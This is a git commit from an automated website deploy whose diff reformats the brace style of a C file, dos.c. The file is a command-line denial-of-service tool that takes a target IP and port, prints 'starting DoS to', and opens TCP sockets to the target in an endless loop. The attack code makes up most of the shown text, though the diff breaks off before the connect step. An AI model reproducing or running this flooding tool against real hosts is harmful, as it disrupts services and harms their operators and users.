a48d9f8959be1b1f6a21d0d42d8c48c4ac2ff5a6
gh-actions <actions@github.com>
2024-08-14 00:14:26 +0000

    Deploy website - based on f68a870ac6e65f15830d845dee2e5f07fc4c0ff6

--- files/c/dos.c
+++ files/c/dos.c
@@ -6,14 +6,17 @@
 #include <netdb.h>
 #include <arpa/inet.h>
 
-int is_invalid_ipv4(const char *ip) {
+int is_invalid_ipv4(const char *ip)
+{
     struct sockaddr_in sa;
     int result = inet_pton(AF_INET, ip, &(sa.sin_addr));
     return result == 0;
 }
 
-int main(int argc, char *argv[]) {
-    if(argc <= 2){
+int main(int argc, char *argv[])
+{
+    if (argc <= 2)
+    {
         printf("Use: %s <IP> <port>\n", argv[0]);
         return 1;
     }
@@ -24,26 +27,30 @@ int main(int argc, char *argv[]) {
     int sockfd;
     struct sockaddr_in target_addr;
 
-    if (is_invalid_ipv4(target_ip)) {
+    if (is_invalid_ipv4(target_ip))
+    {
         printf("invalid IP\n");
         return 1;
     }
 
-    if(port <= 0 || port > 65535 ){
+    if (port <= 0 || port > 65535)
+    {
         printf("port number should be from 1 to 65535\n");
         return 1;
     }
 
     printf("starting DoS to %s:%li\n", target_ip, port);
 
-    while(1){
+    while (1)
+    {
         sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
-        if (sockfd < 0) {
+        if (sockfd < 0)
+        {
             perror("socket");
             return 1;
         }
-        
+
         target_addr.sin_family = AF_INET;
         target_addr.sin_port = htons(port);
         target_addr.sin_addr.s_addr = inet_addr(target_ip);
